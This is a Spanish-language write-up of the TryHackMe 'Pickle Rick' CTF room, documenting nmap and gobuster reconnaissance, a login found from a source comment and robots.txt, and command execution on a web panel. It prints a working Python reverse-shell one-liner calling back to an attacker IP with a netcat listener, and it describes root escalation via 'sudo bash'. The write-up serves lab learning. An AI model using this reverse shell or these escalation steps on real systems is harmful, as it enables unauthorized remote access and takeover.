---
Título: Pickle Rick
Descripción: A Rick and Morty CTF. Help turn Rick back into a human!
Dificultad: Fácil
Página: tryhackme
---
![[Pasted image 20251203130113.png]]
# Introducción
Pickle Rick es una máquina de TryHackMe de tipo CTF y el propósito de este writeup es documentar los pasos que tomé para completarla. En esta room se nos pide encontrar tres ingredientes para la opción de Rick.

# Nmap
Utilizaremos el siguiente comando para escanear la ip del objetivo
```bash
nmap -sV -sC -T4 -p- -vv -oN scan_report picklerick.thm
```
Como resultado obtendremos:
```bash
root@ip-10-82-112-163:~# cat scan_report 
# Nmap 7.80 scan initiated Wed Dec  3 12:20:20 2025 as: nmap -sV -sC -T4 -p- -vv -oN scan_report picklerick.thm
Nmap scan report for picklerick.thm
Host is up, received reset ttl 64 (0.00016s latency).
Scanned at 2025-12-03 12:20:21 GMT for 9s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```
Nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.
# Puerto http(80)
Navegamos al puerto http (picklerick.thm:80)
![[Pasted image 20251203132801.png]]Encontramos una página web.
Lo primero de todo revisamos el código fuente de la página para encontrar cualquier pista.
![[Pasted image 20251203134948.png]]
Encontramos un nombre en un comentario.
## Gobuster
Con el objetivo de buscar directorios y archivos utilizamos gobuster
```bash
gobuster dir -u http://10.80.174.50 -w /usr/share/wordlists/dirb/common.txt -x php,js,html,txt

/assets               (Status: 301) [Size: 313] [--> http://10.80.174.50/assets/]
/denied.php           (Status: 302) [Size: 0] [--> /login.php]
/index.html           (Status: 200) [Size: 1062]
/login.php            (Status: 200) [Size: 882]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
/robots.txt           (Status: 200) [Size: 17]
/server-status        (Status: 403) [Size: 277]

```
### Robots.txt
![[Pasted image 20251203135041.png]]
En este archivo encontramos una combinación de caracteres
### Login.php
En esta página encontramos un panel para inicial sesión.
![[Pasted image 20251203134718.png]]
Si utilizamos el user encontrado junto con los caracteres de robots.txt podremos iniciar sesión 
![[Pasted image 20251203135126.png]]
Nos encontramos con un input en el que se pueden ejecutar comandos, pero hay algunos como cat que están bloqueados
# Primer ingrediente
Con el comando ls encontramos el primer ingrediente en el directorio actual
![[Pasted image 20251203135418.png]]
Utilizamos el comando less para leer el contenido del archivo
![[Pasted image 20251203135845.png]]

# Segundo ingrediente
En el archivo clue.txt nos indican que tendremos que buscar por el sistema los demás ingredientes
![[Pasted image 20251203140500.png]]
Debido a la restricción de ciertos comandos, vamos a probar a usar una reverse shell. Para ello probaremos que versión de python se está usando en el server (se podrían buscar otros servicios). 
En este caso es python3
```bash
which python3
```
![[Pasted image 20251203140706.png]]
## Pentestmonkey
Ahora vamos a usar la herramienta de [shell-reverse-cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#perl) para conseguir una reverse shell aprovechándonos de python. 
![[Pasted image 20251204004542.png]]
```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```
Antes de ejecutarlo cambiaremos la dirección ip por la de nuestra máquina atacante e iniciaremos un netcat listener en el puerto 1234 (importante cambiar python por python3)
```bash
nc -lvnp 1234
```
![[Pasted image 20251204004755.png]]
Una vez ejecutado tendremos una shell con el user www-data, ahora podremos encontrar el resto de ingredientes.
En el directorio /home/rick encontramos el segundo ingrediente.
![[Pasted image 20251204005203.png]]
# Tercer ingrediente
Al ejecutar el comando sudo -l -l para ver que comandos podemos usar con el usuario actual observamos lo siguiente:
![[Pasted image 20251204005536.png]]
Así que será tan sencillo como ejecutar "sudo bash" para acceder al root user
![[Pasted image 20251204005635.png]]
En el directorio de root encontramos el último ingrediente
![[Pasted image 20251204005926.png]]